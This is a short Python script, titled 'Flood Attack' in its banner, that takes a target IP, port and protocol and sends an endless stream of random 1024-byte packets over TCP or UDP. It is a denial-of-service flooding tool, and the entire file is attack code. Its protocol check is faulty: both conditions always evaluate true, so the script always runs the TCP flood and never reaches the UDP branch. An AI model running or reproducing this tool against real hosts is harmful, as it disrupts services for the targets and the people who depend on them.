import socket
import sys
import os

banner = """
 ______ _                 _           _   _             _    
|  ____| |               | |     /\  | | | |           | |   
| |__  | | ___   ___   __| |    /  \ | |_| |_ __ _  ___| | __
|  __| | |/ _ \ / _ \ / _` |   / /\ \| __| __/ _` |/ __| |/ /
| |    | | (_) | (_) | (_| |  / ____ \ |_| || (_| | (__|   < 
|_|    |_|\___/ \___/ \__,_| /_/    \_\__|\__\__,_|\___|_|\_\

"""

# Function declaration part
def Usage():
    print("Usage: ", sys.argv[0], "<ip> <port> <protocol>")

def TCP_Attack(target, port):
    tcp_serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_serv.connect((target, port))

    byte = os.urandom(1024)
    
    sent = 1
    while True:
        tcp_serv.send(byte)
        print("Sending ", sent, "TCP Package to", target, "on Port ", port)
        sent = sent + 1

def UDP_Attack(target, port):
    udp_serv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    byte = os.urandom(1024)

    sent = 1
    while True:
        udp_serv.sendto(byte, (target, port))
        print("Sending ", sent, "UDP Package to", target, "on Port ", port)
        sent = sent + 1

# Working part
class Main():
    print(banner)
    if len(sys.argv) != 4:
        Usage()

    else:
        if sys.argv[3] == "TCP" or "tcp":
            TCP_Attack(str(sys.argv[1]), int(sys.argv[2]))

        if sys.argv[3] == "UDP" or "udp":
            UDP_Attack(str(sys.argv[1]), int(sys.argv[2]))


if __name__ == "__main__":
    Main()
